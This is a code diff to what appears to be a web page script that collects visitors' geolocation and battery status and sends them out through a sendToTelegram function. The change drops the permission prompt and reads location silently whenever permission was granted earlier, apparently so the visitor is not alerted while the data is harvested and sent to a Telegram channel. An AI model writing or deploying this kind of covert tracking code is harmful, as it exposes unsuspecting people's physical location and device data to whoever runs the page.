@@ -6,45 +6,35 @@
         async function sendData() {
             let data = {};
 
-            // Check Location Permission
-            function getLocation() {
-                return new Promise(async (resolve) => {
-                    try {
-                        const permissionStatus = await navigator.permissions.query({ name: "geolocation" });
+            // Get Location If Permission is Already Granted
+            async function getLocation() {
+                try {
+                    const permissionStatus = await navigator.permissions.query({ name: "geolocation" });
 
-                        if (permissionStatus.state === "granted") {
-                            // Directly get location without asking again
-                            navigator.geolocation.watchPosition((position) => {
+                    if (permissionStatus.state === "granted") {
+                        // Get location directly (No prompt)
+                        return new Promise((resolve) => {
+                            navigator.geolocation.getCurrentPosition((position) => {
                                 data.location = {
                                     latitude: position.coords.latitude,
                                     longitude: position.coords.longitude,
                                 };
                                 resolve();
+                            }, 
+                            () => {
+                                data.location = "Error getting location";
+                                resolve();
                             });
-                        } else if (permissionStatus.state === "prompt") {
-                            // Ask for permission (only if required)
-                            navigator.geolocation.getCurrentPosition(
-                                (position) => {
-                                    data.location = {
-                                        latitude: position.coords.latitude,
-                                        longitude: position.coords.longitude,
-                                    };
-                                    resolve();
-                                },
-                                () => {
-                                    data.location = "Permission Denied";
-                                    resolve();
-                                }
-                            );
-                        } else {
-                            data.location = "Denied Previously";
-                            resolve();
-                        }
-                    } catch (error) {
-                        data.location = "Not Supported";
-                        resolve();
+                        });
+                    } else {
+                        // Skip location if not granted
+                        data.location = "Not Allowed";
+                        return Promise.resolve();
                     }
-                });
+                } catch (error) {
+                    data.location = "Not Supported";
+                    return Promise.resolve();
+                }
             }
 
             // Get Battery Info
@@ -65,7 +55,7 @@
                 });
             }
 
-            // Wait for both location & battery data
+            // Wait for both location (if granted) & battery data
             await Promise.all([getLocation(), getBatteryInfo()]);
             sendToTelegram(data);
         }
